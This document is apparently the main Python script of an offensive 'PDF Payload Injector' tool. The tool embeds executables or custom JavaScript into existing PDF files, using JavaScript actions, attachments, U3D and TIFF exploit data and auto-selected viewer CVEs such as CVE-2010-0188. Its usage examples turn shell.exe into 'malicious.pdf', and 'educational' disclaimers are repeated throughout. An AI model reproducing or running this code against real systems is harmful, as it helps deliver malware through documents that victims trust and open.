#!/usr/bin/env python3
"""
PDF Payload Injector - Main Script
Educational and Authorized Security Testing Tool

This tool allows security researchers to embed payloads into existing PDF files
using known vulnerabilities in PDF viewers and document processors.

DISCLAIMER: This tool is intended for educational purposes and authorized
security testing only. Use only on systems you own or have explicit permission
to test.
"""

import os
import sys
import argparse
import base64
import json
import logging
from datetime import datetime
from typing import Optional, Dict, List

# Import modules
from modules.cve_database import CVEDatabase
from modules.exploit_db import ExploitDatabase
from modules.payload_embedder import PayloadEmbedder
from modules.pdf_parser import PDFParser
from modules.vuln_modules import VulnerabilityModules

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('pdf_injector.log')
    ]
)

logger = logging.getLogger(__name__)


class PDFPayloadInjector:
    """Main PDF Payload Injector class"""
    
    def __init__(self, config_path: str = 'config.json'):
        """
        Initialize PDF Payload Injector
        
        Args:
            config_path: Path to configuration file
        """
        self.config = self._load_config(config_path)
        self.cve_db = CVEDatabase(self.config)
        self.exploit_db = ExploitDatabase(self.config)
        self.payload_embedder = PayloadEmbedder(self.config)
        self.pdf_parser = PDFParser(self.config)
        self.vuln_modules = VulnerabilityModules(self.config)
        
        logger.info("PDF Payload Injector initialized")
    
    def _load_config(self, config_path: str) -> Dict:
        """Load configuration from file"""
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
            else:
                logger.warning(f"Config file not found: {config_path}, using defaults")
                return {}
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            return {}
    
    def inject_payload(self, input_pdf: str, output_pdf: str, payload_path: str,
                      target_os: str = 'windows', cve: str = None, edb_id: str = None,
                      custom_script: str = None, method: str = 'javascript') -> bool:
        """
        Inject payload into PDF
        
        Args:
            input_pdf: Input PDF file path
            output_pdf: Output PDF file path
            payload_path: Payload file path (if not using custom script)
            target_os: Target operating system
            cve: Specific CVE to use
            edb_id: Specific Exploit-DB ID to use
            custom_script: Custom JavaScript file path
            method: Injection method
            
        Returns:
            True if injection successful, False otherwise
        """
        try:
            logger.info(f"Starting payload injection: {input_pdf} -> {output_pdf}")
            
            # Validate input PDF
            pdf_content = self.pdf_parser.load_pdf(input_pdf)
            if not pdf_content:
                logger.error("Failed to load input PDF")
                return False
            
            # Get PDF information
            pdf_info = self.pdf_parser.get_pdf_info(pdf_content)
            logger.info(f"Input PDF info: Version {pdf_info.get('version')}, {pdf_info.get('pages')} pages")
            
            # Load payload or custom script
            if custom_script:
                logger.info("Using custom JavaScript script")
                with open(custom_script, 'r') as f:
                    script_content = f.read()
                
                # Inject custom script
                modified_pdf = self.pdf_parser._add_javascript(pdf_content, script_content)
            
            else:
                # Load payload
                payload = self.payload_embedder.load_payload(payload_path)
                if not payload:
                    logger.error("Failed to load payload")
                    return False
                
                # Validate payload
                is_valid, message = self.payload_embedder.validate_payload(payload, target_os)
                if not is_valid:
                    logger.error(f"Payload validation failed: {message}")
                    return False
                
                # Get payload info
                payload_info = self.payload_embedder.get_payload_info(payload)
                logger.info(f"Payload info: {payload_info['file_type']}, {payload_info['size']} bytes")
                
                # Select vulnerability
                if cve:
                    logger.info(f"Using specified CVE: {cve}")
                    vulnerability = self.cve_db.get_cve_details(cve)
                    if not vulnerability:
                        logger.error(f"CVE not found: {cve}")
                        return False
                elif edb_id:
                    logger.info(f"Using specified Exploit-DB ID: {edb_id}")
                    exploit = self.exploit_db.get_exploit_by_id(edb_id)
                    if not exploit:
                        logger.error(f"Exploit-DB ID not found: {edb_id}")
                        return False
                    cve = exploit.get('cve')
                    vulnerability = self.cve_db.get_cve_details(cve) if cve else None
                else:
                    # Auto-select best vulnerability
                    logger.info("Auto-selecting best vulnerability...")
                    vulnerability = self.cve_db.get_best_vulnerability(target_os, len(payload))
                    if vulnerability:
                        logger.info(f"Selected vulnerability: {vulnerability['cve_id']} - {vulnerability['name']}")
                    else:
                        logger.warning("No suitable vulnerability found, using generic injection")
                
                # Create exploit
                if vulnerability:
                    exploit = self.vuln_modules.create_exploit_for_cve(vulnerability['cve_id'], payload)
                    if exploit:
                        logger.info(f"Created exploit: {exploit['description']}")
                        # Apply exploit modifications
                        modified_pdf = self._apply_exploit(pdf_content, exploit)
                    else:
                        logger.warning("Failed to create exploit, using generic injection")
                        modified_pdf = self.payload_embedder.embed_payload_in_pdf(pdf_content, payload, method)
                else:
                    # Generic payload embedding
                    modified_pdf = self.payload_embedder.embed_payload_in_pdf(pdf_content, payload, method)
            
            if not modified_pdf:
                logger.error("Failed to modify PDF")
                return False
            
            # Save modified PDF
            success = self.pdf_parser.save_pdf(modified_pdf, output_pdf)
            if not success:
                logger.error("Failed to save output PDF")
                return False
            
            # Verify output
            output_info = self.pdf_parser.get_pdf_info(modified_pdf)
            logger.info(f"Output PDF info: {output_info['size']} bytes")
            
            logger.info("Payload injection completed successfully")
            return True
        
        except Exception as e:
            logger.error(f"Error during injection: {e}")
            return False
    
    def _apply_exploit(self, pdf_content: bytes, exploit: Dict) -> Optional[bytes]:
        """Apply exploit to PDF content"""
        try:
            modifications = exploit.get('pdf_modifications', {})
            
            if modifications.get('type') == 'javascript_action':
                js_code = modifications.get('javascript', '')
                return self.pdf_parser._add_javascript(pdf_content, js_code)
            
            elif modifications.get('type') == 'embedded_image':
                # Embed payload as image
                image_data = modifications.get('stream', '')
                payload = base64.b64decode(image_data)
                return self.payload_embedder._inject_as_attachment(pdf_content, payload, 'image.tif')
            
            elif modifications.get('type') == '3d_annotation':
                # Embed U3D exploit
                u3d_data = modifications.get('data', '')
                payload = base64.b64decode(u3d_data)
                return self.payload_embedder._inject_as_attachment(pdf_content, payload, 'model.u3d')
            
            else:
                logger.warning(f"Unknown exploit type: {modifications.get('type')}")
                return pdf_content
        
        except Exception as e:
            logger.error(f"Error applying exploit: {e}")
            return None
    
    def list_vulnerabilities(self, target_os: str = None) -> None:
        """List available vulnerabilities"""
        vulnerabilities = self.cve_db.list_vulnerabilities()
        
        print("\n" + "="*80)
        print("AVAILABLE VULNERABILITIES")
        print("="*80)
        
        for vuln in vulnerabilities:
            if target_os and target_os.lower() not in [os.lower() for os in vuln['target_os']]:
                continue
            
            print(f"\nCVE: {vuln['cve_id']}")
            print(f"Name: {vuln['name']}")
            print(f"CVSS: {vuln['cvss']}")
            print(f"Type: {vuln['type']}")
            print(f"Target OS: {', '.join(vuln['target_os'])}")
        
        print("\n" + "="*80 + "\n")
    
    def list_exploits(self, platform: str = None) -> None:
        """List available exploits"""
        exploits = self.exploit_db.list_exploits()
        
        print("\n" + "="*80)
        print("AVAILABLE EXPLOITS")
        print("="*80)
        
        for exp in exploits:
            if platform and platform.lower() != exp['platform'].lower():
                continue
            
            print(f"\nEDB-ID: {exp['edb_id']}")
            print(f"Title: {exp['title']}")
            print(f"CVE: {exp.get('cve', 'N/A')}")
            print(f"Platform: {exp['platform']}")
            print(f"Type: {exp['type']}")
            print(f"Verified: {'Yes' if exp['verified'] else 'No'}")
        
        print("\n" + "="*80 + "\n")
    
    def analyze_pdf(self, pdf_path: str) -> None:
        """Analyze PDF file"""
        pdf_content = self.pdf_parser.load_pdf(pdf_path)
        if not pdf_content:
            print(f"Error: Failed to load PDF: {pdf_path}")
            return
        
        info = self.pdf_parser.get_pdf_info(pdf_content)
        security = self.pdf_parser.analyze_pdf_security(pdf_content)
        
        print("\n" + "="*80)
        print(f"PDF ANALYSIS: {pdf_path}")
        print("="*80)
        
        print(f"\nPDF Version: {info.get('version')}")
        print(f"File Size: {info['size']} bytes")
        print(f"Pages: {info['pages']}")
        print(f"Objects: {info['objects']}")
        
        print(f"\nMetadata:")
        print(f"  Title: {info.get('title', 'N/A')}")
        print(f"  Author: {info.get('author', 'N/A')}")
        print(f"  Creator: {info.get('creator', 'N/A')}")
        print(f"  Producer: {info.get('producer', 'N/A')}")
        
        print(f"\nSecurity Analysis:")
        print(f"  Encrypted: {'Yes' if security['encrypted'] else 'No'}")
        print(f"  Has JavaScript: {'Yes' if security['has_javascript'] else 'No'}")
        print(f"  Has Forms: {'Yes' if security['has_forms'] else 'No'}")
        print(f"  Has Annotations: {'Yes' if security['has_annotations'] else 'No'}")
        print(f"  External References: {'Yes' if security['has_external_references'] else 'No'}")
        
        # Find JavaScript
        if security['has_javascript']:
            js_blocks = self.pdf_parser.find_javascript(pdf_content)
            print(f"\nJavaScript Blocks Found: {len(js_blocks)}")
            for i, js in enumerate(js_blocks[:3]):  # Show first 3
                print(f"  Block {i+1}: {js[:100]}...")
        
        # Find embedded files
        if info['has_embedded_files']:
            files = self.pdf_parser.find_embedded_files(pdf_content)
            print(f"\nEmbedded Files: {len(files)}")
            for file in files:
                print(f"  - {file['filename']}")
        
        print("\n" + "="*80 + "\n")
    
    def interactive_mode(self):
        """Run in interactive mode"""
        print("\n" + "="*80)
        print("PDF Payload Injector - Interactive Mode")
        print("="*80)
        print("\nDISCLAIMER: This tool is for educational and authorized security testing only.")
        print("Use only on systems you own or have explicit permission to test.\n")
        
        while True:
            print("\nOptions:")
            print("1. Inject payload into PDF")
            print("2. List vulnerabilities")
            print("3. List exploits")
            print("4. Analyze PDF")
            print("5. Exit")
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == '1':
                self._interactive_inject()
            elif choice == '2':
                self._interactive_list_vulns()
            elif choice == '3':
                self._interactive_list_exploits()
            elif choice == '4':
                self._interactive_analyze()
            elif choice == '5':
                print("\nExiting...")
                break
            else:
                print("Invalid choice. Please try again.")
    
    def _interactive_inject(self):
        """Interactive payload injection"""
        print("\n--- Payload Injection ---")
        
        input_pdf = input("Input PDF file: ").strip()
        output_pdf = input("Output PDF file: ").strip()
        
        print("\nPayload Options:")
        print("1. Use existing payload file")
        print("2. Use custom JavaScript script")
        payload_choice = input("Select option (1-2): ").strip()
        
        if payload_choice == '1':
            payload_path = input("Payload file: ").strip()
            target_os = input("Target OS (windows/linux/macos): ").strip().lower()
            
            print("\nVulnerability Selection:")
            print("1. Auto-select best vulnerability")
            print("2. Specify CVE")
            print("3. Specify Exploit-DB ID")
            vuln_choice = input("Select option (1-3): ").strip()
            
            cve = None
            edb_id = None
            
            if vuln_choice == '2':
                cve = input("Enter CVE (e.g., CVE-2010-0188): ").strip()
            elif vuln_choice == '3':
                edb_id = input("Enter Exploit-DB ID: ").strip()
            
            self.inject_payload(input_pdf, output_pdf, payload_path, target_os, cve, edb_id)
        
        elif payload_choice == '2':
            custom_script = input("Custom JavaScript file: ").strip()
            self.inject_payload(input_pdf, output_pdf, None, custom_script=custom_script)
    
    def _interactive_list_vulns(self):
        """Interactive vulnerability listing"""
        target_os = input("Filter by target OS (press Enter for all): ").strip() or None
        self.list_vulnerabilities(target_os)
    
    def _interactive_list_exploits(self):
        """Interactive exploit listing"""
        platform = input("Filter by platform (press Enter for all): ").strip() or None
        self.list_exploits(platform)
    
    def _interactive_analyze(self):
        """Interactive PDF analysis"""
        pdf_path = input("PDF file to analyze: ").strip()
        self.analyze_pdf(pdf_path)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='PDF Payload Injector - Educational and Authorized Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Inject Windows payload with auto-selected vulnerability
  python pdf_injector.py --input original.pdf --output malicious.pdf --payload shell.exe --target windows
  
  # Use specific CVE
  python pdf_injector.py --input doc.pdf --output exploit.pdf --payload shell.exe --cve CVE-2010-0188
  
  # Use custom JavaScript
  python pdf_injector.py --input doc.pdf --output custom.pdf --custom-script malicious.js
  
  # List vulnerabilities
  python pdf_injector.py --list-vulns
  
  # Analyze PDF
  python pdf_injector.py --analyze document.pdf
  
  # Interactive mode
  python pdf_injector.py --interactive

DISCLAIMER: This tool is intended for educational purposes and authorized
security testing only. Use only on systems you own or have explicit permission
to test.
        """
    )
    
    parser.add_argument('--input', '-i', help='Input PDF file')
    parser.add_argument('--output', '-o', help='Output PDF file')
    parser.add_argument('--payload', '-p', help='Payload file to embed')
    parser.add_argument('--target', '-t', help='Target OS (windows/linux/macos)')
    parser.add_argument('--cve', '-c', help='Use specific CVE vulnerability')
    parser.add_argument('--edb', '-e', help='Use specific Exploit-DB vulnerability')
    parser.add_argument('--custom-script', help='Use custom JavaScript script')
    parser.add_argument('--method', '-m', default='javascript',
                       help='Injection method (javascript/launch/attachment)')
    parser.add_argument('--list-vulns', action='store_true', help='List available vulnerabilities')
    parser.add_argument('--list-exploits', action='store_true', help='List available exploits')
    parser.add_argument('--analyze', '-a', help='Analyze PDF file')
    parser.add_argument('--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('--config', default='config.json', help='Configuration file')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    # Set debug logging
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize injector
    injector = PDFPayloadInjector(args.config)
    
    # Execute based on arguments
    if args.interactive:
        injector.interactive_mode()
    
    elif args.list_vulns:
        injector.list_vulnerabilities()
    
    elif args.list_exploits:
        injector.list_exploits()
    
    elif args.analyze:
        injector.analyze_pdf(args.analyze)
    
    elif args.input and args.output:
        # Payload injection
        if not args.payload and not args.custom_script:
            print("Error: Either --payload or --custom-script must be specified")
            sys.exit(1)
        
        success = injector.inject_payload(
            args.input,
            args.output,
            args.payload,
            args.target or 'windows',
            args.cve,
            args.edb,
            args.custom_script,
            args.method
        )
        
        if success:
            print(f"\nSuccess: Payload injected into {args.output}")
            sys.exit(0)
        else:
            print(f"\nError: Failed to inject payload")
            sys.exit(1)
    
    else:
        parser.print_help()
        sys.exit(0)


if __name__ == '__main__':
    # Print disclaimer
    print("\n" + "="*80)
    print("PDF PAYLOAD INJECTOR - Educational and Authorized Security Testing Tool")
    print("="*80)
    print("\n⚠️  IMPORTANT DISCLAIMER")
    print("This tool is intended for educational purposes and authorized security")
    print("testing only. Use only on systems you own or have explicit permission")
    print("to test. Unauthorized use is illegal and unethical.")
    print("\nBy using this tool, you agree to these terms and assume all")
    print("responsibility for its use.")
    print("="*80 + "\n")
    
    main()